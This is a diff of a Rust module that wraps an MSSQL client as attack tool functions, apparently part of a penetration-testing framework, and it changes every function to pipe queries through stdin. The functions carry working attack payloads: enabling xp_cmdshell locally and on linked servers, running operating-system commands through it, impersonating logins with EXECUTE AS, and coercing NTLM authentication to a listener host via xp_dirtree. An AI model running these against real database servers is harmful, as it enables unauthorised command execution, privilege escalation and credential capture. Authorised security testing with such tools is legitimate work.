@@ -24,6 +24,11 @@ fn mssql_base(
         .timeout_secs(120)
 }
 
+/// Pipe a SQL query via stdin to an mssqlclient CommandBuilder and execute.
+async fn mssql_query(cmd: CommandBuilder, query: &str) -> Result<ToolOutput> {
+    cmd.stdin(format!("{query}\nexit\n")).execute().await
+}
+
 /// Extract common MSSQL args from JSON and build a base CommandBuilder.
 fn mssql_from_args(args: &Value) -> Result<CommandBuilder> {
     let target = required_str(args, "target")?;
@@ -42,7 +47,7 @@ fn mssql_from_args(args: &Value) -> Result<CommandBuilder> {
 pub async fn mssql_command(args: &Value) -> Result<ToolOutput> {
     let command = required_str(args, "command")?;
 
-    mssql_from_args(args)?.flag("-Q", command).execute().await
+    mssql_query(mssql_from_args(args)?, command).await
 }
 
 /// Enable xp_cmdshell on a MSSQL server.
@@ -53,7 +58,7 @@ pub async fn mssql_enable_xp_cmdshell(args: &Value) -> Result<ToolOutput> {
     let query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; \
                  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
 
-    mssql_from_args(args)?.flag("-Q", query).execute().await
+    mssql_query(mssql_from_args(args)?, query).await
 }
 
 /// Enumerate impersonation permissions on a MSSQL server.
@@ -63,7 +68,7 @@ pub async fn mssql_enable_xp_cmdshell(args: &Value) -> Result<ToolOutput> {
 pub async fn mssql_enum_impersonation(args: &Value) -> Result<ToolOutput> {
     let query = "SELECT * FROM sys.server_permissions WHERE type = 'IM';";
 
-    mssql_from_args(args)?.flag("-Q", query).execute().await
+    mssql_query(mssql_from_args(args)?, query).await
 }
 
 /// Impersonate a login and execute a query on a MSSQL server.
@@ -76,10 +81,7 @@ pub async fn mssql_impersonate(args: &Value) -> Result<ToolOutput> {
 
     let full_query = format!("EXECUTE AS LOGIN = '{impersonate_user}'; {query}");
 
-    mssql_from_args(args)?
-        .flag("-Q", &full_query)
-        .execute()
-        .await
+    mssql_query(mssql_from_args(args)?, &full_query).await
 }
 
 /// Enumerate linked servers on a MSSQL server.
@@ -87,10 +89,7 @@ pub async fn mssql_impersonate(args: &Value) -> Result<ToolOutput> {
 /// Required args: `target`, `username`
 /// Optional args: `password`, `domain`, `windows_auth`
 pub async fn mssql_enum_linked_servers(args: &Value) -> Result<ToolOutput> {
-    mssql_from_args(args)?
-        .flag("-Q", "EXEC sp_linkedservers;")
-        .execute()
-        .await
+    mssql_query(mssql_from_args(args)?, "EXEC sp_linkedservers;").await
 }
 
 /// Execute a query on a linked MSSQL server.
@@ -103,10 +102,7 @@ pub async fn mssql_exec_linked(args: &Value) -> Result<ToolOutput> {
 
     let full_query = format!("EXEC ('{query}') AT [{linked_server}];");
 
-    mssql_from_args(args)?
-        .flag("-Q", &full_query)
-        .execute()
-        .await
+    mssql_query(mssql_from_args(args)?, &full_query).await
 }
 
 /// Enable xp_cmdshell on a linked MSSQL server.
@@ -121,10 +117,7 @@ pub async fn mssql_linked_enable_xpcmdshell(args: &Value) -> Result<ToolOutput> 
          EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}];"
     );
 
-    mssql_from_args(args)?
-        .flag("-Q", &full_query)
-        .execute()
-        .await
+    mssql_query(mssql_from_args(args)?, &full_query).await
 }
 
 /// Execute a command via xp_cmdshell on a linked MSSQL server.
@@ -137,10 +130,7 @@ pub async fn mssql_linked_xpcmdshell(args: &Value) -> Result<ToolOutput> {
 
     let full_query = format!("EXEC ('xp_cmdshell ''{command}''') AT [{linked_server}];");
 
-    mssql_from_args(args)?
-        .flag("-Q", &full_query)
-        .execute()
-        .await
+    mssql_query(mssql_from_args(args)?, &full_query).await
 }
 
 /// Coerce NTLM authentication from a MSSQL server via xp_dirtree.
@@ -152,8 +142,5 @@ pub async fn mssql_ntlm_coerce(args: &Value) -> Result<ToolOutput> {
 
     let full_query = format!("EXEC master..xp_dirtree '\\\\{listener_ip}\\share'");
 
-    mssql_from_args(args)?
-        .flag("-Q", &full_query)
-        .execute()
-        .await
+    mssql_query(mssql_from_args(args)?, &full_query).await
 }
